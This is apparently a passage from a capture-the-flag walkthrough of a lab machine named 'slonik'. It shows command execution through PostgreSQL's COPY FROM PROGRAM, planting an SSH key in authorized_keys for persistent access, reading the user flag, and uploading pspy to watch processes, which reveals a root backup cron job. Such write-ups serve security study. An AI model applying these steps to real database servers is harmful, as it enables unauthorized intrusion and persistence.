@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
```

At the same time

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ psql -h localhost -p 5432 -U postgres 
psql (18.3 (Debian 18.3-1+b1), server 14.19 (Ubuntu 14.19-0ubuntu0.22.04.1))
Type "help" for help.

postgres=# 
```

```
postgres=# \list
                                                   List of databases
   Name    |  Owner   | Encoding | Locale Provider | Collate |  Ctype  | ICU Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+---------+---------+------------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | 
 service   | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | 
 template0 | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | =c/postgres          +
           |          |          |                 |         |         |            |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | C.UTF-8 | C.UTF-8 |            |           | =c/postgres          +
           |          |          |                 |         |         |            |           | postgres=CTc/postgres
(4 rows)

```

To execute commands via PostgreSQL, I’ll create a table to store output, copy results into it, and get them:

```
postgres=# CREATE TABLE cmd(output text);
CREATE TABLE
postgres=# COPY cmd FROM PROGRAM 'id';
COPY 1
postgres=# COPY cmd FROM PROGRAM 'whoami';
COPY 1
postgres=# select * from cmd;
                                 output                                 
------------------------------------------------------------------------
 uid=115(postgres) gid=123(postgres) groups=123(postgres),122(ssl-cert)
 postgres
(2 rows)
```

The `passwd` file shows the postgres user’s home directory is `/var/lib/postgresql`. It doesn’t have a `.ssh` directory, but I’ll create one, and give it my public key:

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ cd ~/.ssh/    
                                                                                                                   
┌──(parallels㉿kali-linux-2025-2)-[~/.ssh]
└─$ ls
agent  id_ed25519  id_ed25519.pub  known_hosts  known_hosts.old
                                                                                                                   
┌──(parallels㉿kali-linux-2025-2)-[~/.ssh]
└─$ cat id_ed25519.pub                            
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321

```

```
postgres=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321
') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
COPY 1
postgres=# 
```

Now will be ok

```
┌──(parallels㉿kali-linux-2025-2)-[~/.ssh]
└─$ ssh -i ~/keys/ed25519_gen postgres@10.129.234.160

Warning: Identity file /home/parallels/keys/ed25519_gen not accessible: No such file or directory.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1036-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri Apr  3 06:29:38 UTC 2026

  System load:           0.0
  Usage of /:            42.4% of 6.59GB
  Memory usage:          7%
  Swap usage:            0%
  Processes:             239
  Users logged in:       0
  IPv4 address for eth0: 10.129.234.160
  IPv6 address for eth0: dead:beef::250:56ff:feb9:88d3

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

postgres@slonik:~$ 
```

```
postgres@slonik:~$ cat user.txt
2b5f3f93ef223555f4a5a8b29393fe9d
postgres@slonik:~$ 
```

```
──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ scp -i ~/keys/ed25519_gen ./pspy64 postgres@10.129.234.160:/dev/shm/
Warning: Identity file /home/parallels/keys/ed25519_gen not accessible: No such file or directory.
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@/     %@@@@@@@@@@.      @&             @@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@   ############.    ############   ##########*  &@@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###############  ###################  /##########  @@@@@@@@@@@@@ 
@@@@@@@@@@ ###############( #######################(  #########  @@@@@@@@@@@@ 
@@@@@@@@@  ############### (#########################  ######### @@@@@@@@@@@@ 
@@@@@@@@@ .##############  ###########################( #######  @@@@@@@@@@@@ 
@@@@@@@@@  ############## (        ##############        ######  @@@@@@@@@@@@ 
@@@@@@@@@. ############## #####   # .########### ##  ##  #####. @@@@@@@@@@@@@ 
@@@@@@@@@@ .############# /########  ########### *##### ###### @@@@@@@@@@@@@@ 
@@@@@@@@@@. ############# (########( ###########/ ##### ##### (@@@@@@@@@@@@@@ 
@@@@@@@@@@@  ###########( #########, ############( ####  ### (@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@ (##########/ #########  ##############  ##  #( @@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@( ###########  #######  ################  / #  @@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@  ############  ####  ###################    @@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@, ##########  @@@      ################            (@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@ .######  @@@@   ###  ##############  #######   @@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@(  *   @. #######    ############## (@((&@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%&@@@@  #############( @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #############  @@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/ ############# ,@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ ############( @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  ###########  @@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #######*  @@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
pspy64                                                                           100% 3032KB   1.3MB/s   00:02  
```

```
postgres@slonik:/dev/shm$ chmod +x pspy64
postgres@slonik:/dev/shm$ timeout  120 ./pspy64  -pf -i 1000 | grep "CMD:"
```

{{< code >}}\
postgres@slonik:/dev/shm\$ timeout  120 ./pspy64  -pfd -i 1000 | grep "CMD:"\
2026/04/03 07:17:34 CMD: UID=115   PID=10911  | ./pspy64 -pfd -i 1000\
2026/04/03 07:17:34 CMD: UID=115   PID=10910  | grep CMD:\
2026/04/03 07:17:34 CMD: UID=115   PID=10909  | timeout 120 ./pspy64 -pfd -i 1000\
2026/04/03 07:17:34 CMD: UID=0     PID=10888  | /snap/amazon-ssm-agent/7628/amazon-ssm-agent\
2026/04/03 07:17:34 CMD: UID=0     PID=10606  |\
2026/04/03 07:17:34 CMD: UID=0     PID=10388  |\
2026/04/03 07:17:34 CMD: UID=0     PID=9839   |\
2026/04/03 07:17:34 CMD: UID=0     PID=7768   |\
2026/04/03 07:17:34 CMD: UID=0     PID=7402   |\
2026/04/03 07:17:34 CMD: UID=0     PID=7144   |\
2026/04/03 07:17:34 CMD: UID=115   PID=6310   | -bash\
2026/04/03 07:17:34 CMD: UID=115   PID=6309   | sshd: postgres@pts/1\
2026/04/03 07:17:34 CMD: UID=0     PID=6251   | sshd: postgres \[priv]\
2026/04/03 07:17:34 CMD: UID=0     PID=6091   |\
2026/04/03 07:17:34 CMD: UID=0     PID=6012   |\
2026/04/03 07:17:34 CMD: UID=0     PID=4872   |\
2026/04/03 07:17:34 CMD: UID=0     PID=4053   |\
2026/04/03 07:17:34 CMD: UID=0     PID=3756   |\
2026/04/03 07:17:34 CMD: UID=115   PID=2650   | -bash\
2026/04/03 07:17:34 CMD: UID=115   PID=2649   | sshd: postgres@pts/0\
2026/04/03 07:17:34 CMD: UID=115   PID=2587   | (sd-pam)\
2026/04/03 07:17:34 CMD: UID=115   PID=2586   | /lib/systemd/systemd --user\
2026/04/03 07:17:34 CMD: UID=0     PID=2583   | sshd: postgres \[priv]\
2026/04/03 07:17:34 CMD: UID=0     PID=2256   |\
2026/04/03 07:17:34 CMD: UID=115   PID=1672   | postgres: 14/main: postgres postgres \[local] idle\
2026/04/03 07:17:34 CMD: UID=1337  PID=1387   | sshd: service\
2026/04/03 07:17:34 CMD: UID=1337  PID=1303   | (sd-pam)\
2026/04/03 07:17:34 CMD: UID=1337  PID=1302   | /lib/systemd/systemd --user\
2026/04/03 07:17:34 CMD: UID=0     PID=1292   | sshd: service \[priv]\
2026/04/03 07:17:34 CMD: UID=0     PID=1213   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1212   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1211   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1210   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1209   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1208   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1207   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1206   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1203   | /sbin/agetty -o -p -- \u --noclear tty1 linux\
2026/04/03 07:17:34 CMD: UID=0     PID=1202   |\
2026/04/03 07:17:34 CMD: UID=0     PID=1196   | sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic\_run\_authorized\_keys %u %f -o AuthorizedKeysCommandUser ec2-instance-connect \[listener] 0 of 10-100 startups\
2026/04/03 07:17:34 CMD: UID=117   PID=1185   | /sbin/rpc.statd\
2026/04/03 07:17:34 CMD: UID=0     PID=1183   | /usr/sbin/rpc.mountd\
2026/04/03 07:17:34 CMD: UID=0     PID=1178   | /usr/sbin/cron -f -P\
2026/04/03 07:17:34 CMD: UID=115   PID=895    | postgres: 14/main: logical replication launcher\
2026/04/03 07:17:34 CMD: UID=115   PID=894    | postgres: 14/main: stats collector\
2026/04/03 07:17:34 CMD: UID=115   PID=893    | postgres: 14/main: autovacuum launcher\
2026/04/03 07:17:34 CMD: UID=115   PID=892    | postgres: 14/main: walwriter\
2026/04/03 07:17:34 CMD: UID=115   PID=891    | postgres: 14/main: background writer\
2026/04/03 07:17:34 CMD: UID=115   PID=890    | postgres: 14/main: checkpointer\
2026/04/03 07:17:34 CMD: UID=115   PID=876    | /usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main -c config\_file=/etc/postgresql/14/main/postgresql.conf\
2026/04/03 07:17:34 CMD: UID=114   PID=868    | /usr/sbin/chronyd -F 1\
2026/04/03 07:17:34 CMD: UID=114   PID=866    | /usr/sbin/chronyd -F 1\
2026/04/03 07:17:34 CMD: UID=0     PID=596    | /lib/systemd/systemd-logind\
2026/04/03 07:17:34 CMD: UID=0     PID=595    | /usr/lib/snapd/snapd\
2026/04/03 07:17:34 CMD: UID=104   PID=592    | /usr/sbin/rsyslogd -n -iNONE\
2026/04/03 07:17:34 CMD: UID=0     PID=591    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers\
2026/04/03 07:17:34 CMD: UID=0     PID=590    | /usr/sbin/irqbalance --foreground\
2026/04/03 07:17:34 CMD: UID=102   PID=585    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only\
2026/04/03 07:17:34 CMD: UID=0     PID=583    | /usr/sbin/acpid\
2026/04/03 07:17:34 CMD: UID=101   PID=560    | /lib/systemd/systemd-resolved\
2026/04/03 07:17:34 CMD: UID=0     PID=543    |\
2026/04/03 07:17:34 CMD: UID=0     PID=525    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0\
2026/04/03 07:17:34 CMD: UID=100   PID=504    | /lib/systemd/systemd-networkd\
2026/04/03 07:17:34 CMD: UID=0     PID=480    | /usr/bin/vmtoolsd\
2026/04/03 07:17:34 CMD: UID=998   PID=472    | /usr/local/sbin/laurel --config /etc/laurel/config.toml\
2026/04/03 07:17:34 CMD: UID=0     PID=469    | /sbin/auditd\
2026/04/03 07:17:34 CMD: UID=0     PID=468    | /usr/sbin/nfsdcld\
2026/04/03 07:17:34 CMD: UID=0     PID=464    | /usr/sbin/rpc.idmapd\
2026/04/03 07:17:34 CMD: UID=0     PID=463    | /usr/sbin/blkmapd\
2026/04/03 07:17:34 CMD: UID=116   PID=455    | /sbin/rpcbind -f -w\
2026/04/03 07:17:34 CMD: UID=0     PID=396    |\
2026/04/03 07:17:34 CMD: UID=0     PID=373    |\
2026/04/03 07:17:34 CMD: UID=0     PID=372    |\
2026/04/03 07:17:34 CMD: UID=0     PID=371    |\
2026/04/03 07:17:34 CMD: UID=0     PID=370    |\
2026/04/03 07:17:34 CMD: UID=0     PID=369    |\
2026/04/03 07:17:34 CMD: UID=0     PID=367    |\
2026/04/03 07:17:34 CMD: UID=0     PID=366    |\
2026/04/03 07:17:34 CMD: UID=0     PID=363    |\
2026/04/03 07:17:34 CMD: UID=0     PID=362    |\
2026/04/03 07:17:34 CMD: UID=0     PID=361    |\
2026/04/03 07:17:34 CMD: UID=0     PID=357    |\
2026/04/03 07:17:34 CMD: UID=0     PID=353    |\
2026/04/03 07:17:34 CMD: UID=0     PID=343    |\
2026/04/03 07:17:34 CMD: UID=0     PID=342    |\
2026/04/03 07:17:34 CMD: UID=0     PID=341    |\
2026/04/03 07:17:34 CMD: UID=0     PID=340    |\
2026/04/03 07:17:34 CMD: UID=0     PID=339    |\
2026/04/03 07:17:34 CMD: UID=0     PID=338    |\
2026/04/03 07:17:34 CMD: UID=0     PID=335    |\
2026/04/03 07:17:34 CMD: UID=0     PID=333    |\
2026/04/03 07:17:34 CMD: UID=0     PID=315    |\
2026/04/03 07:17:34 CMD: UID=0     PID=314    |\
2026/04/03 07:17:34 CMD: UID=0     PID=307    |\
2026/04/03 07:17:34 CMD: UID=0     PID=306    |\
2026/04/03 07:17:34 CMD: UID=0     PID=305    |\
2026/04/03 07:17:34 CMD: UID=0     PID=304    |\
2026/04/03 07:17:34 CMD: UID=0     PID=303    |\
2026/04/03 07:17:34 CMD: UID=0     PID=302    |\
2026/04/03 07:17:34 CMD: UID=0     PID=300    |\
2026/04/03 07:17:34 CMD: UID=0     PID=298    |\
2026/04/03 07:17:34 CMD: UID=0     PID=296    |\
2026/04/03 07:17:34 CMD: UID=0     PID=295    |\
2026/04/03 07:17:34 CMD: UID=0     PID=294    |\
2026/04/03 07:17:34 CMD: UID=0     PID=293    |\
2026/04/03 07:17:34 CMD: UID=0     PID=292    |\
2026/04/03 07:17:34 CMD: UID=0     PID=291    |\
2026/04/03 07:17:34 CMD: UID=0     PID=290    |\
2026/04/03 07:17:34 CMD: UID=0     PID=289    |\
2026/04/03 07:17:34 CMD: UID=0     PID=288    |\
2026/04/03 07:17:34 CMD: UID=0     PID=287    |\
2026/04/03 07:17:34 CMD: UID=0     PID=286    |\
2026/04/03 07:17:34 CMD: UID=0     PID=285    |\
2026/04/03 07:17:34 CMD: UID=0     PID=284    |\
2026/04/03 07:17:34 CMD: UID=0     PID=282    |\
2026/04/03 07:17:34 CMD: UID=0     PID=281    |\
2026/04/03 07:17:34 CMD: UID=0     PID=280    |\
2026/04/03 07:17:34 CMD: UID=0     PID=279    |\
2026/04/03 07:17:34 CMD: UID=0     PID=277    |\
2026/04/03 07:17:34 CMD: UID=0     PID=276    |\
2026/04/03 07:17:34 CMD: UID=0     PID=275    |\
2026/04/03 07:17:34 CMD: UID=0     PID=274    |\
2026/04/03 07:17:34 CMD: UID=0     PID=273    |\
2026/04/03 07:17:34 CMD: UID=0     PID=272    |\
2026/04/03 07:17:34 CMD: UID=0     PID=270    |\
2026/04/03 07:17:34 CMD: UID=0     PID=269    |\
2026/04/03 07:17:34 CMD: UID=0     PID=268    |\
2026/04/03 07:17:34 CMD: UID=0     PID=267    |\
2026/04/03 07:17:34 CMD: UID=0     PID=266    |\
2026/04/03 07:17:34 CMD: UID=0     PID=265    |\
2026/04/03 07:17:34 CMD: UID=0     PID=264    |\
2026/04/03 07:17:34 CMD: UID=0     PID=248    |\
2026/04/03 07:17:34 CMD: UID=0     PID=239    |\
2026/04/03 07:17:34 CMD: UID=0     PID=238    |\
2026/04/03 07:17:34 CMD: UID=0     PID=237    |\
2026/04/03 07:17:34 CMD: UID=0     PID=203    | /lib/systemd/systemd-udevd\
2026/04/03 07:17:34 CMD: UID=0     PID=200    | /sbin/multipathd -d -s\
2026/04/03 07:17:34 CMD: UID=0     PID=199    |\
2026/04/03 07:17:34 CMD: UID=0     PID=198    |\
2026/04/03 07:17:34 CMD: UID=0     PID=197    |\
2026/04/03 07:17:34 CMD: UID=0     PID=196    |\
2026/04/03 07:17:34 CMD: UID=0     PID=180    |\
2026/04/03 07:17:34 CMD: UID=0     PID=179    |\
2026/04/03 07:17:34 CMD: UID=0     PID=161    | /lib/systemd/systemd-journald\
2026/04/03 07:17:34 CMD: UID=0     PID=122    |\
2026/04/03 07:17:34 CMD: UID=0     PID=121    |\
2026/04/03 07:17:34 CMD: UID=0     PID=120    |\
2026/04/03 07:17:34 CMD: UID=0     PID=119    |\
2026/04/03 07:17:34 CMD: UID=0     PID=105    |\
2026/04/03 07:17:34 CMD: UID=0     PID=103    |\
2026/04/03 07:17:34 CMD: UID=0     PID=96     |\
2026/04/03 07:17:34 CMD: UID=0     PID=95     |\
2026/04/03 07:17:34 CMD: UID=0     PID=93     |\
2026/04/03 07:17:34 CMD: UID=0     PID=92     |\
2026/04/03 07:17:34 CMD: UID=0     PID=91     |\
2026/04/03 07:17:34 CMD: UID=0     PID=90     |\
2026/04/03 07:17:34 CMD: UID=0     PID=89     |\
2026/04/03 07:17:34 CMD: UID=0     PID=88     |\
2026/04/03 07:17:34 CMD: UID=0     PID=87     |\
2026/04/03 07:17:34 CMD: UID=0     PID=86     |\
2026/04/03 07:17:34 CMD: UID=0     PID=85     |\
2026/04/03 07:17:34 CMD: UID=0     PID=84     |\
2026/04/03 07:17:34 CMD: UID=0     PID=83     |\
2026/04/03 07:17:34 CMD: UID=0     PID=82     |\
2026/04/03 07:17:34 CMD: UID=0     PID=81     |\
2026/04/03 07:17:34 CMD: UID=0     PID=80     |\
2026/04/03 07:17:34 CMD: UID=0     PID=79     |\
2026/04/03 07:17:34 CMD: UID=0     PID=78     |\
2026/04/03 07:17:34 CMD: UID=0     PID=77     |\
2026/04/03 07:17:34 CMD: UID=0     PID=76     |\
2026/04/03 07:17:34 CMD: UID=0     PID=75     |\
2026/04/03 07:17:34 CMD: UID=0     PID=74     |\
2026/04/03 07:17:34 CMD: UID=0     PID=73     |\
2026/04/03 07:17:34 CMD: UID=0     PID=72     |\
2026/04/03 07:17:34 CMD: UID=0     PID=71     |\
2026/04/03 07:17:34 CMD: UID=0     PID=70     |\
2026/04/03 07:17:34 CMD: UID=0     PID=69     |\
2026/04/03 07:17:34 CMD: UID=0     PID=68     |\
2026/04/03 07:17:34 CMD: UID=0     PID=67     |\
2026/04/03 07:17:34 CMD: UID=0     PID=66     |\
2026/04/03 07:17:34 CMD: UID=0     PID=65     |\
2026/04/03 07:17:34 CMD: UID=0     PID=64     |\
2026/04/03 07:17:34 CMD: UID=0     PID=63     |\
2026/04/03 07:17:34 CMD: UID=0     PID=62     |\
2026/04/03 07:17:34 CMD: UID=0     PID=61     |\
2026/04/03 07:17:34 CMD: UID=0     PID=60     |\
2026/04/03 07:17:34 CMD: UID=0     PID=59     |\
2026/04/03 07:17:34 CMD: UID=0     PID=58     |\
2026/04/03 07:17:34 CMD: UID=0     PID=57     |\
2026/04/03 07:17:34 CMD: UID=0     PID=56     |\
2026/04/03 07:17:34 CMD: UID=0     PID=55     |\
2026/04/03 07:17:34 CMD: UID=0     PID=54     |\
2026/04/03 07:17:34 CMD: UID=0     PID=53     |\
2026/04/03 07:17:34 CMD: UID=0     PID=52     |\
2026/04/03 07:17:34 CMD: UID=0     PID=51     |\
2026/04/03 07:17:34 CMD: UID=0     PID=50     |\
2026/04/03 07:17:34 CMD: UID=0     PID=48     |\
2026/04/03 07:17:34 CMD: UID=0     PID=47     |\
2026/04/03 07:17:34 CMD: UID=0     PID=46     |\
2026/04/03 07:17:34 CMD: UID=0     PID=45     |\
2026/04/03 07:17:34 CMD: UID=0     PID=44     |\
2026/04/03 07:17:34 CMD: UID=0     PID=43     |\
2026/04/03 07:17:34 CMD: UID=0     PID=42     |\
2026/04/03 07:17:34 CMD: UID=0     PID=40     |\
2026/04/03 07:17:34 CMD: UID=0     PID=39     |\
2026/04/03 07:17:34 CMD: UID=0     PID=38     |\
2026/04/03 07:17:34 CMD: UID=0     PID=37     |\
2026/04/03 07:17:34 CMD: UID=0     PID=36     |\
2026/04/03 07:17:34 CMD: UID=0     PID=35     |\
2026/04/03 07:17:34 CMD: UID=0     PID=33     |\
2026/04/03 07:17:34 CMD: UID=0     PID=32     |\
2026/04/03 07:17:34 CMD: UID=0     PID=31     |\
2026/04/03 07:17:34 CMD: UID=0     PID=30     |\
2026/04/03 07:17:34 CMD: UID=0     PID=29     |\
2026/04/03 07:17:34 CMD: UID=0     PID=27     |\
2026/04/03 07:17:34 CMD: UID=0     PID=26     |\
2026/04/03 07:17:34 CMD: UID=0     PID=25     |\
2026/04/03 07:17:34 CMD: UID=0     PID=23     |\
2026/04/03 07:17:34 CMD: UID=0     PID=22     |\
2026/04/03 07:17:34 CMD: UID=0     PID=21     |\
2026/04/03 07:17:34 CMD: UID=0     PID=20     |\
2026/04/03 07:17:34 CMD: UID=0     PID=19     |\
2026/04/03 07:17:34 CMD: UID=0     PID=18     |\
2026/04/03 07:17:34 CMD: UID=0     PID=17     |\
2026/04/03 07:17:34 CMD: UID=0     PID=16     |\
2026/04/03 07:17:34 CMD: UID=0     PID=15     |\
2026/04/03 07:17:34 CMD: UID=0     PID=14     |\
2026/04/03 07:17:34 CMD: UID=0     PID=13     |\
2026/04/03 07:17:34 CMD: UID=0     PID=12     |\
2026/04/03 07:17:34 CMD: UID=0     PID=9      |\
2026/04/03 07:17:34 CMD: UID=0     PID=7      |\
2026/04/03 07:17:34 CMD: UID=0     PID=6      |\
2026/04/03 07:17:34 CMD: UID=0     PID=5      |\
2026/04/03 07:17:34 CMD: UID=0     PID=4      |\
2026/04/03 07:17:34 CMD: UID=0     PID=3      |\
2026/04/03 07:17:34 CMD: UID=0     PID=2      |\
2026/04/03 07:17:34 CMD: UID=0     PID=1      | /sbin/init\
2026/04/03 07:17:34 CMD: UID=0     PID=10920  | (snap)\
2026/04/03 07:17:34 CMD: UID=0     PID=10926  | /usr/lib/snapd/snap-seccomp version-info\
2026/04/03 07:17:45 CMD: UID=0     PID=10941  |\
2026/04/03 07:17:45 CMD: UID=0     PID=10946  | /usr/bin/snap run amazon-ssm-agent\
2026/04/03 07:17:49 CMD: UID=115   PID=10960  | /usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main -c config\_file=/etc/postgresql/14/main/postgresql.conf\
2026/04/03 07:17:56 CMD: UID=0     PID=10961  | (snap)\
2026/04/03 07:17:56 CMD: UID=0     PID=10967  | /usr/lib/snapd/snap-seccomp version-info\
2026/04/03 07:18:01 CMD: UID=0     PID=10981  | /usr/sbin/CRON -f -P\
2026/04/03 07:18:01 CMD: UID=0     PID=10982  | /usr/sbin/CRON -f -P\
2026/04/03 07:18:01 CMD: UID=0     PID=10983  | /bin/bash /usr/bin/backup\
2026/04/03 07:18:01 CMD: UID=0     PID=10984  |\
2026/04/03 07:18:01 CMD: UID=0     PID=10985  | /usr/bin/rm -rf /opt/backups/current/PG\_VERSION /opt/backups/current/backup\_label /opt/backups/current/backup\_manifest /opt/backups/current/base /opt/backups/current/bash /opt/backups/current/global /opt/backups/current/pg\_commit\_ts /opt/backups/current/pg\_dynshmem /opt/backups/current/pg\_logical /opt/backups/current/pg\_multixact /opt/backups/current/pg\_notify /opt/backups/current/pg\_replslot /opt/backups/current/pg\_serial /opt/backups/current/pg\_snapshots /opt/backups/current/pg\_stat /opt/backups/current/pg\_stat\_tmp /opt/backups/current/pg\_subtrans /opt/backups/current/pg\_tblspc /opt/backups/current/pg\_twophase /opt/backups/current/pg\_wal /opt/backups/current/pg\_xact /opt/backups/current/postgresql.auto.conf\
2026/04/03 07:18:02 CMD: UID=0     PID=10986  | /usr/bin/perl /usr/bin/pg\_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/\
2026/04/03 07:18:02 CMD: UID=115   PID=10987  | postgres: 14/main: walsender postgres \[local] startup\
2026/04/03 07:18:02 CMD: UID=115   PID=10988  | postgres: 14/main: walsender postgres \[local] startup\
2026/04/03 07:18:02 CMD: UID=0     PID=10989  | /usr/lib/postgresql/14/bin/pg\_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/\
2026/04/03 07:18:03 CMD: UID=0     PID=10990  |\
2026/04/03 07:18:04 CMD: UID=0     PID=10991  | /bin/bash /usr/bin/backup\
2026/04/03 07:18:04 CMD: UID=0     PID=10992  | /bin/bash /usr/bin/backup\
2026/04/03 07:18:04 CMD: UID=0     PID=10993  | /bin/bash /usr/bin/backup\
2026/04/03 07:18:07 CMD: UID=0     PID=10994  | (snap)\
2026/04/03 07:18:07 CMD: UID=0     PID=11001  |\
2026/04/03 07:18:10 CMD: UID=115   PID=11015  | postgres: 14/main: autovacuum worker\
2026/04/03 07:18:17 CMD: UID=0     PID=11016  |\
2026/04/03 07:18:17 CMD: UID=0     PID=11021  |\
2026/04/03 07:18:28 CMD: UID=0     PID=11035  |\
2026/04/03 07:18:28 CMD: UID=0     PID=11041  | /usr/bin/snap run amazon-ssm-agent\
2026/04/03 07:18:29 CMD: UID=115   PID=11055  | postgres: 14/main: autovacuum worker\
